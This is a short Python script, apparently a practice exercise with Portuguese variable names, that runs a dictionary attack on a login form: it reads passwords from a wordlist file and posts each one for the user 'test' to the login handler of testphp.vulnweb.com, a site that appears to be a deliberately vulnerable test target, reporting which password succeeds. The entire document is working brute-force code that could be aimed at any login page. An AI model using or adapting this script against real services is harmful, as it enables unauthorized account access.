import requests

with open ("caminho_wordlist.txt", "r") as file:
    wordlist = file.read().splitlines()

    for senha in wordlist:
        data = {
            "user": "test",
            "password": senha
        }
        response = requests.post("http://testphp.vulnweb.com/userinfo.php", data=data)
        if "logout" in response.text:
            print(f"senha correta {senha}")

        else:
            print(f"senha incorreta {senha}")